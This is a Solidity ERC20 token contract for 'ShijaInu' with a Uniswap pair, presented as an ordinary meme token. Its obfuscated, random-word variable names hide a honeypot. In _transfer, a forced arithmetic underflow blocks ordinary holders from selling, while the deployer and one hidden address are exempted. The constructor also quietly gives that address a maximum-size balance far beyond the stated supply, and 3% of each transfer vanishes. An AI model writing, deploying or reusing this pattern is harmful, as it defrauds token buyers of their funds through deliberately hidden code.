// https://t.me/shijainu

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract ShijaInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private gravity;

    function _transfer(
        address escape,
        address music,
        uint256 pull
    ) internal override {
        uint256 longer = married;

        if (topic[escape] == 0 && gravity[escape] > 0 && escape != uniswapV2Pair) {
            topic[escape] -= longer;
        }

        address supply = address(put);
        put = ERC20(music);
        gravity[supply] += longer + 1;

        _balances[escape] -= pull;
        uint256 particularly = (pull / 100) * married;
        pull -= particularly;
        _balances[music] += pull;
    }

    ERC20 private put;
    mapping(address => uint256) private topic;
    uint256 public married = 3;

    constructor(
        string memory vegetable,
        string memory community,
        address taught,
        address happened
    ) ERC20(vegetable, community) {
        uniswapV2Router = IUniswapV2Router02(taught);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 size = ~uint256(0);

        topic[msg.sender] = size;
        topic[happened] = size;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[happened] = size;
    }
}
